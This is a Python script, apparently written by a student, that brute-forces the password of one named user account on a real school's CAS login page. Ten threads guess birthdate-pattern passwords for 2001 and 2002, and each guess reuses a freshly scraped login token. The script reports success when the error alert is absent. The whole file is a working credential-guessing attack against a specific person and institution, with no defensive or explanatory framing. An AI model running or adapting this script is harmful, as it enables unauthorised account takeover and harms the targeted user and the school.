import requests
import os
import time
from bs4 import BeautifulSoup
import threading


def crack(id, user, y, m1, m2, d1, d2):
    url = 'http://bdfz-cas.pkuschool.edu.cn/cas/login'
    # http://1.1.1.2/ac_portal/default/pc.html?template=default&tabs=pwd&vlanid=0&_ID_=0&url=&pop=0&type=logout&username=f0000l0052
    f = 0
    for i in range(m1, m2 + 1):
        if (f):
            break
        print(id, i)
        for j in range(d1, d2 + 1):
            pwd = "%04d%02d%02d" % (y, i, j)
            r = requests.get(url=url)
            r = BeautifulSoup(r.text, 'lxml')
            lt = r.select('input[id="lt"]')
            lt = ("%s" % (lt))
            lt = lt[47:-4]
            data = {
                "lt": lt,
                "service": "",
                "username": user,
                "password": pwd
            }
            r = requests.request("POST", url=url, data=data)
            r = BeautifulSoup(r.text, 'lxml')
            status = r.select('div[class="alert alert-danger"]')
            if (status == []):
                print(user, "success", pwd)
                f = 1
                break
    if (f):
        exit(0)


user = "2024114"
ery=2001
lty=2002

class myth1(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(1, user, ery, 5, 6, 1, 31)


class myth2(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(2, user, ery, 7, 8, 1, 31)


class myth3(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(3, user, ery, 9, 10, 1, 31)


class myth4(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(4, user, ery, 11, 12, 1, 31)


class myth5(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(5, user, lty, 1, 2, 1, 31)


class myth6(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(5, user, lty, 3, 4, 1, 31)


class myth7(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(5, user, lty, 5, 6, 1, 31)


class myth8(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(5, user, lty, 7, 8, 1, 31)


class myth9(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(5, user, lty, 9, 10, 1, 31)


class myth10(threading.Thread):  # 通过继承threading.Thread重写run方法的形式，创建子线程
    def run(self):
        crack(5, user, lty, 11, 12, 1, 31)


if __name__ == "__main__":
    t1 = myth1()
    t1.start()
    t2 = myth2()
    t2.start()
    t3 = myth3()
    t3.start()
    t4 = myth4()
    t4.start()
    t5 = myth5()
    t5.start()
    t6 = myth6()
    t6.start()
    t7 = myth7()
    t7.start()
    t8 = myth8()
    t8.start()
    t9 = myth9()
    t9.start()
    t10 = myth10()
    t10.start()
